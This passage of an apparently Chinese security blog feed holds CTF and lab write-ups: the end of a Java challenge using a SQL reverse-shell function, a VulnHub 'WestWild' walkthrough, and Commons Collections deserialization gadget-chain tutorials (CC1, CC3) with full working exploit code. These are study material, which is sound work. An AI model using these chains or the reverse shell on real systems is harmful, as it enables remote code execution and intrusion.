&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    p.destroy();</span><br><span class="line">    s.close();</span><br><span class="line">    return &quot;Connected&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$$;</span><br><span class="line"></span><br><span class="line">-- 调用函数，填入你的公网 IP 和监听端口</span><br><span class="line">CALL SHELL(&#x27;ip&#x27;, 9999);</span><br></pre></td></tr></table></figure>
<p>用sh执行反弹shell，让ai写了个反弹shell的sql代码<br>用python开个服务<br><img src="/posts/32c2684d/20260128024639007.png" alt="image.png"><br><img src="/posts/32c2684d/20260128025020247.png" alt="image.png"><br>发包<br><img src="/posts/32c2684d/20260128025056816.png" alt="image.png"></p>
<p>拿到flag</p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>题目</category>
      </categories>
  </entry>
  <entry>
    <title>WestWild</title>
    <url>/posts/f0e039ca/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/posts/f0e039ca/1760578765027-d8404183-4293-42b8-bb90-66120471c270.png" alt="img"></p>
<p>扫描出靶机</p>
<p><img src="/posts/f0e039ca/1760578792429-50ffb720-b32c-47fa-a872-7dce9a7a1a5d.png" alt="img"></p>
<p>扫描端口号</p>
<p><img src="/posts/f0e039ca/1760578825040-8c13b0d0-f18a-499c-961e-7278157243da.png" alt="img"></p>
<p>漏洞扫描</p>
<p><img src="/posts/f0e039ca/1760578849798-20c6aecd-5faa-47c7-845a-057aabde78a7.png" alt="img"></p>
<p>目录扫描</p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>我们在信息收集中对端口扫描时发现了445端口，开启了SMB协议。</p>
<p><img src="/posts/f0e039ca/1760578995595-6095d3cc-6844-44b0-a481-0ecfc0661bed.png" alt="img"></p>
<p>可能存在共享目录，可以枚举用户和查找共享文件(工具：enum4linux)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux 192.168.213.134</span><br></pre></td></tr></table></figure>

<p><img src="/posts/f0e039ca/1760579469194-71f14a44-cd17-4942-8070-300b89c5740b.png" alt="img"></p>
<p>这里有一个共享文件，我们尝试访问</p>
<p><img src="/posts/f0e039ca/1760579549778-e5aa767e-305e-4e5a-bd8e-a1d24e0c4409.png" alt="img"></p>
<p>空密码</p>
<p><img src="/posts/f0e039ca/1760579626813-887c78ca-9886-4e40-8ab9-0bd4b66c845e.png" alt="img"></p>
<p>我们把文件get到本地查看</p>
<p><img src="/posts/f0e039ca/1760579694293-229b80fe-4bac-4ad1-bd0f-d541cea3e5b5.png" alt="img"></p>
<p>含有flag1和用户名与密码，上述信息收集中有22端口开放，尝试连接一下</p>
<p><img src="/posts/f0e039ca/1760579812603-03819529-9027-44c6-9d39-7dcef7c6f3c6.png" alt="img"></p>
<p><img src="/posts/f0e039ca/1760579843535-98fb5fcd-3def-41ab-a8b3-e787f2927a13.png" alt="img"></p>
<p><img src="/posts/f0e039ca/1760579924373-2233ed82-0638-4167-989e-b84cbcddb726.png" alt="img"></p>
<p>权限不够，尝试提权</p>
<p>找具有写的权限的文件</p>
<p><img src="/posts/f0e039ca/1760580685090-e5448701-0ccd-47fb-bc56-0d4778e04958.png" alt="img"></p>
<p><img src="/posts/f0e039ca/1760580748185-7eb9d29c-e637-4bbe-9887-43216cbebe9c.png" alt="img"></p>
<p>发现可执行文件</p>
<p><img src="/posts/f0e039ca/1760580788144-0048beb1-3916-4f76-baad-8785c1804cca.png" alt="img"></p>
<p>又一组账号密码，登陆看看</p>
<p><img src="/posts/f0e039ca/1760580951377-11ba1da0-74c7-4fb8-900e-629aaac3bce8.png" alt="img"></p>
<p>爽遭了。</p>
<p><img src="/posts/f0e039ca/1760581017674-6058c675-4b53-4099-9d27-69a9e4ad4ca6.png" alt="img"></p>
<p><img src="/posts/f0e039ca/1760581041998-aa31ac77-3c2c-401c-8e0b-b89ea4fe9950.png" alt="img"></p>
<p>结束</p>
]]></content>
      <categories>
        <category>src</category>
        <category>打靶</category>
      </categories>
  </entry>
  <entry>
    <title>cc链1(2)</title>
    <url>/posts/aeb57b4a/</url>
    <content><![CDATA[<p>和第一条链子类似，只是这里使用了lazyMap类里的get方法来调用了transform，继续向上找谁调用了get方法，我们可以找到AnnotationInvocationHandler类里的invoke方法调用了get方法，而AnnotationInvocationHandler的接口是invocationHandler，所以在动态代理时可以调用到invoker所以我们可以实现一下。</p>
<p><img src="/posts/aeb57b4a/1757411305685-8902431e-ac2c-4a22-a15d-78985d79b091.png" alt="img"></p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ex1.www;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">       Class c = Runtime.class;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(c),</span><br><span class="line">                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       HashMap&lt;Object,Object&gt; map = new HashMap();</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; decorate = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class r = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor ctor = r.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        InvocationHandler o = (InvocationHandler) ctor.newInstance(Override.class, decorate);</span><br><span class="line"></span><br><span class="line">        Map o1 = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, o);</span><br><span class="line"></span><br><span class="line">        Object o2 = ctor.newInstance(Override.class, o1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(o2);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unserialize(String s) throws Exception &#123;</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        Object o = objectInputStream.readObject();</span><br><span class="line">        return o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正着分析一下，AnnotationInvocationHandler对readObject进行了重写，然后调用了Map（proxy）的entryset，因为对entryset函数进行了调用，所以会调用处理器的invoke方法，然后就会调用到get方法（由于目标代理类传的是LazyMap类,所以是LazyMap调用了get），最后调用了transform，剩下的步骤和之前一样。</p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>cc链</category>
      </categories>
  </entry>
  <entry>
    <title>cc链1</title>
    <url>/posts/9e8a5add/</url>
    <content><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>1.下载jdku65</p>
<p><a href="https://blog.lupf.cn/articles/2022/02/19/1645283454543.html">https://blog.lupf.cn/articles/2022/02/19/1645283454543.html</a></p>
<p><img src="/posts/9e8a5add/1756963441452-07504a87-8dc4-4a46-9cfe-a9b2661eacf7.png" alt="img"></p>
<p>2,依赖配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>



<p>3.将class文件转化为java文件</p>
<p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p>
<p><img src="/posts/9e8a5add/1756963679059-7996b57a-c7b9-49f3-9627-6008de7f4c0d.png" alt="img"></p>
<p>点击zip，进行下载</p>
<p>然后解压jdk文件夹下的src文件，将刚刚下载的压缩包解压后，把&#x2F;src&#x2F;share&#x2F;classes下的sun文件拖到src文件下，并添加到元路径</p>
<p><img src="/posts/9e8a5add/1756963858002-2f52e65b-5a05-411c-9f8b-8efe2a5f9758.png" alt="img"></p>
<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>对反序列化过程进行一个简单的介绍：首先呢，先找到一个可以利用的类（调用了危险的方法），然后呢，我们需要去找谁（哪个方法）调用了这个方法，直到找到可以readobject方法（对其重写）。这个类的话就是起始类（这个过程是从后向前的一个过程）。</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>cc链1的危险方法是transformer接口的transform的方法，来看一下（找实现类）</p>
<p><img src="/posts/9e8a5add/1756965750960-9dddeae0-1272-4b3e-ad0d-0098b182855b.png" alt="img"></p>
<p>这里有三个类</p>
<p>chainedTransformer</p>
<p><img src="/posts/9e8a5add/1756965814924-cea4c586-f799-42d5-8285-c4c12f86f681.png" alt="img"></p>
<p>存储到数组中做一个循环调用</p>
<p>ConstantTransformer</p>
<p><img src="/posts/9e8a5add/1756965925732-3cff8ba9-64b7-444c-afa8-3a02c84d7510.png" alt="img"></p>
<p>不管传什么返回的都是构造函数传的内容</p>
<p>InvokerTransformer</p>
<p><img src="/posts/9e8a5add/1756966002527-69bf3f9a-4e70-48b3-879c-68e767599167.png" alt="img"></p>
<p>进行一个反射，函数调用。这也是主要利用点，因为我们的Runtime类是不能进行反序列化的，要使用反射来对getRuntime方法，exec方法，进行调用。使用反射的话就要用到我们的InvokerTransformer类了</p>
<p><img src="/posts/9e8a5add/1756966405655-6db692c4-1bbb-4d24-8b52-af9dad7f46e2.png" alt="img"></p>
<p>无serializable接口不能进行序列化</p>
<p><img src="/posts/9e8a5add/1756966462595-01ce2c2d-9559-4672-a329-d2020950fe38.png" alt="img"></p>
<p>所以使用反射进行序列化</p>
<h2 id="主要过程"><a href="#主要过程" class="headerlink" title="主要过程"></a>主要过程</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>还是倒着来，我们要使用InvokerTransformer的transform方法调用反射机制构造命令执行</p>
<p>我们先看普通反射如何构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class c = Runtime.class;</span><br><span class="line">      Method m = c.getDeclaredMethod(&quot;getRuntime&quot;,null);</span><br><span class="line">      m.setAccessible(true);</span><br><span class="line">      Runtime o = (Runtime) m.invoke(null,null);</span><br><span class="line">      o.exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure>

<p>然后我们使用InvokerTransformer的transform方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Method invokerTransformer = (Method) new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(c);</span><br><span class="line">      Runtime r= (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(invokerTransformer);</span><br><span class="line">      new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br></pre></td></tr></table></figure>



<p>ChainedTransformer类的transform的方法就可以帮我们进行一个遍历，所以我们可以改成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer[] t =  new Transformer[]&#123;</span><br><span class="line">              new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">              new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">              new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">      &#125;;</span><br><span class="line">       ChainedTransformer chainedtransformer = new ChainedTransformer(t);</span><br><span class="line">       chainedtransformer.transform(c);</span><br></pre></td></tr></table></figure>

<p>这时的transform是我们自己写的，我们需要反序列化的时候自动调用，就需要去找谁调用了</p>
<p>transform，以此向上找到重写readObject方法的类，才能完成整个链子的调用。</p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>我们开始向上找</p>
<p><img src="/posts/9e8a5add/1756969921699-68c6b178-860e-48e0-9b74-cf0cf361b0dd.png" alt="img"></p>
<p>我们在查找用法中找到这个方法调用了transform（记得设置成查找所有文件）</p>
<p>但是他的构造方法是protected</p>
<p><img src="/posts/9e8a5add/1756970184298-b91f2953-7270-4e21-bded-a7d066fa992c.png" alt="img"></p>
<p>看看哪里可以实例化这个对象</p>
<p><img src="/posts/9e8a5add/1756970215601-6465056a-46cc-46bd-b02c-d64d829a6329.png" alt="img"></p>
<p>这里可以</p>
<p><img src="/posts/9e8a5add/image-20251027213647169.png" alt="image-20251027213647169"></p>
<p>然后我们只要让上述属性为chainedtransformer即可调用到transform</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;key&quot;,&quot;value&quot;);</span><br><span class="line">        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, null, chainedtransformer);</span><br></pre></td></tr></table></figure>

<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>接着向上找，谁调用了checksetvalue</p>
<p><img src="/posts/9e8a5add/1756971173079-871f302f-7569-467b-99b9-04c2aba043db.png" alt="img"></p>
<p>我们来到了这，那得让parent &#x3D; TransformedMap</p>
<p>那如何让parent为TransformedMap这个呢？我们可以探究一下</p>
<p>看一下哪里有实例化的MapEntry（AbstractInputCheckedMapDecorator的副类）</p>
<p><img src="/posts/9e8a5add/1756971878741-79f6bf05-94e4-4b86-9904-9284d491b451.png" alt="img"></p>
<p>这里的都在EntrySet类下，而实例化EntrySet要使用entrySet方法</p>
<p><img src="/posts/9e8a5add/1756971944236-adc3887f-5c47-4878-a4e1-c85b327148af.png" alt="img"></p>
<p>这里的this就是parent，意思是谁调用了entryset，this就是谁，那我们要看它所在的类了，是一个抽象类</p>
<p><img src="/posts/9e8a5add/1756972181249-c5dbd1c6-5a82-4e92-9bdf-fe785318b658.png" alt="img"></p>
<p>我们这时就要看他的子类了，用子类来调用父类</p>
<p><img src="/posts/9e8a5add/1756972239098-780b30a4-c187-4a16-a793-57ddafcf69fc.png" alt="img"></p>
<p>我们可以看到TransformMap类，非常的巧合，又完美哈。</p>
<p>（在for循环中也可以调用entrySet，然后调用setvalue）</p>
<h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>找谁调用了setvalue</p>
<p><img src="/posts/9e8a5add/1756972773999-eefc64b9-181d-4875-9701-808b6b3e1eb5.png" alt="img"></p>
<p>正好还是readObject方法调用</p>
<p>然后我们可以看到</p>
<p><img src="/posts/9e8a5add/1756978753636-9a33915a-2212-4bff-ba7b-81a88b1dcdde.png" alt="img"></p>
<p>这边会使用for循环进行一个遍历，然后我们map只要传入decorate即可，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, null, chainedtransformer);</span><br></pre></td></tr></table></figure>

<p>这样就相当于TransformedMap类的实例化调用了entrySet() 这样parent就是TransformedMap对象</p>
<p>还有一个问题是这里的构造函数是默认我们不能直接拿来用，需要使用反射获取</p>
<p><img src="/posts/9e8a5add/1756979103381-e7ba53b5-4b24-4d48-9d61-453fa6a054ed.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class cc = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor declaredConstructor = cc.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">        Object o = declaredConstructor.newInstance(Target.class,decorate);</span><br></pre></td></tr></table></figure>

<p>然后就是要通过判断了，这里</p>
<p><img src="/posts/9e8a5add/1756979897710-cd26f03e-abbd-4367-9ca5-01d192141508.png" alt="img"></p>
<p>主要是判断我们put的key值是否和注解中的成员变量对应</p>
<p><img src="/posts/9e8a5add/1756980036133-a8cfc14e-a2c4-4cfb-90b8-9f62528a8a3b.png" alt="img"></p>
<p><img src="/posts/9e8a5add/1756980032659-0d9204be-8286-4685-befc-d358f54a2b9c.png" alt="img"></p>
<p>这样既可</p>
<p>最后一个问题是</p>
<p><img src="/posts/9e8a5add/1756980102446-bbeb3e49-0cc5-407a-9833-f056deaf9989.png" alt="img"></p>
<p>transform的参数是ann…，而我们想要他为c怎么办呢？</p>
<p>回到上述描述的ConstantTransformer类的transform方法不就解决了，我们传入c就会返回c</p>
<p>所以最后在加一个构造为、</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer[] t =  new Transformer[]&#123;</span><br><span class="line">               new ConstantTransformer(c),</span><br><span class="line">               new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">               new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">               new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">       &#125;;</span><br></pre></td></tr></table></figure>

<p>总体为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ex1.www;</span><br><span class="line"></span><br><span class="line">import javafx.scene.transform.Transform;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import sun.util.resources.cldr.st.CalendarData_st_LS;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Class c = Runtime.class;</span><br><span class="line"></span><br><span class="line">//        Method invokerTransformer = (Method) new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(c);</span><br><span class="line">//        Runtime r= (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(invokerTransformer);</span><br><span class="line">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="line"></span><br><span class="line">       Transformer[] t =  new Transformer[]&#123;</span><br><span class="line">               new ConstantTransformer(c),</span><br><span class="line">               new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">               new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">               new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">        ChainedTransformer chainedtransformer = new ChainedTransformer(t);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;,&quot;value&quot;);</span><br><span class="line">        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, null, chainedtransformer);</span><br><span class="line"></span><br><span class="line">        Class cc = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor declaredConstructor = cc.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">        Object o = declaredConstructor.newInstance(Target.class,decorate);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//        Method m = c.getDeclaredMethod(&quot;getRuntime&quot;,null);</span><br><span class="line">//        m.setAccessible(true);</span><br><span class="line">//        Runtime o = (Runtime) m.invoke(null,null);</span><br><span class="line">//        o.exec(&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object o) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unserialize(String file) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        Object oic = ois.readObject();</span><br><span class="line">        return oic;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/news/12115">https://xz.aliyun.com/news/12115</a></p>
<p><a href="https://blog.csdn.net/qq_45305211/article/details/141720808">https://blog.csdn.net/qq_45305211/article/details/141720808</a></p>
<p>blibli 白日梦组长</p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>cc链</category>
      </categories>
  </entry>
  <entry>
    <title>cc链3</title>
    <url>/posts/70843bf1/</url>
    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>我用的cc1的环境</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>cc链3主要使用的是任意类的加载作为尾部实现攻击，使用的是TemplatesImpl的defineTransletClasses方法中调用的defineClass(TransletClassLoader是Templates类的副类而它的父类正好就是ClassLoader)，这边对defineClass的调用正好就是对父类defineclass的调用。</p>
<p><img src="/posts/70843bf1/1761140219579-1a42a81e-52d3-4c35-9866-506d528f7c4d.png" alt="img"></p>
<p>注意点：</p>
<p><img src="/posts/70843bf1/1761141193804-9bc29853-326b-4584-8b35-623636bc1817.png" alt="img"></p>
<p>这是一个全新的方法，不算重写（个人理解），后面的才是一个调用父类defineclass方法的函数。</p>
<p>然后找谁调用defineTransletClasses方法，是getTransletInstance这个方法，这个方法中有一个参数要控制一下</p>
<p><img src="/posts/70843bf1/1761141499634-f171f4b8-5b0f-4b49-bc4e-4813749b2016.png" alt="img"></p>
<p>_name不能为空，_class必须要为空，在找谁调用了getTransletInstance,是newTransformer方法</p>
<p>这个属性要传参，就会报错出问题，怎么解决呢？</p>
<p><img src="/posts/70843bf1/1761141842252-0441873d-c640-44ab-8c6d-99c4e56f651e.png" alt="img"></p>
<p>给它这个值即可。</p>
<p>然后是_bytecodes这个属性，是一个二维的，这里我们让一维byte等于恶意类的字节码，然后再以数组的形式套上一层。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">byte[] b = Files.readAllBytes(Paths.get(&quot;D:\\Desktop\\java\\javacc\\target\\classes\\shell.class&quot;));</span><br><span class="line">byte[][] _b = &#123;b&#125;;</span><br></pre></td></tr></table></figure>

<p>然后还有一个问题是在</p>
<p><img src="/posts/70843bf1/1761142433934-acb1e0c3-b8e8-4e84-8b5b-23a17748a17b.png" alt="img"></p>
<p>superClass是我们的危险类，这里我们需要让_transletIndex不满足小于0，因此我们不能进else所以，我们要让红圈的条件为真，既让加载的动态类继承AbstractTranslet类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import com.sun.xml.internal.ws.api.pipe.helper.AbstractTubeImpl;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class shell extends AbstractTranslet &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题找的差不多了，我们接着分析谁调用了newTransformer类是TrAXFilter类的构造方法，这里会发现TrAXFilter的方法是不可以序列化的，这时候就要配合InstantiateTransformer类（直接new的话代码就会直接执行，还不能序列化）</p>
<p><img src="/posts/70843bf1/1761143033389-e9288c6b-273f-40a1-9255-547fde9c3762.png" alt="img"></p>
<p>相当于反射调用类的构造方法吧(Class可以序列化)，然后我们就要调用transform方法，接下来就和cc链1一样了。</p>
<p>整体为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc3 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        Class c = templates.getClass();</span><br><span class="line">        Field _name = c.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        _name.setAccessible(true);</span><br><span class="line">        _name.set(templates, 